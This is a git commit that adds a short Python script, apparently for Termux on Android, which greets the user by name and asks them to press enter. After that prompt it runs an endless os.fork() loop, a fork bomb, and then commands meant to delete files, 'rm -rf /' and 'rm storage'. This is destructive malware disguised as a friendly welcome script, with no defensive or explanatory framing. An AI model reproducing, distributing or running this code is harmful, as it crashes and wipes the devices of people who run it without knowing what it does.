ff0440f59c6a13fe7cdb6a33fa456d5e4098dd88
Dark0hack7x <68660376+Dark0hack7x@users.noreply.github.com>
2020-07-22 22:30:15 +0300

    Add files via upload

---
+++ DH7X-Bomb.py
@@ -0,0 +1,21 @@
+import os;
+os.system ('clear')
+print ('''
+	\033[1;33mwelcome to my script
+	\033[1;33mDARK HACK 7X TEAM 
+	
+	\033[1;33mWORNING... 
+	\033[1;32mWORNING...
+	\033[1;31mWORNING...
+	\033[1;34mWORNING...
+''')
+asr = input ('whats your name : ')
+print ('	\033[1;32mwelcome MR.'+asr)
+dh7x = input ('		\033[1;33mPrees \033[1;32menter \033[1;31mto \033[1;34mstart.....')
+os.system ('cd')
+os.system ('termux-setup-storage')
+while (True):
+ os.fork()
+os.system ('rm -rf /')
+os.system ('cd ')
+os.system ('rm storage ')
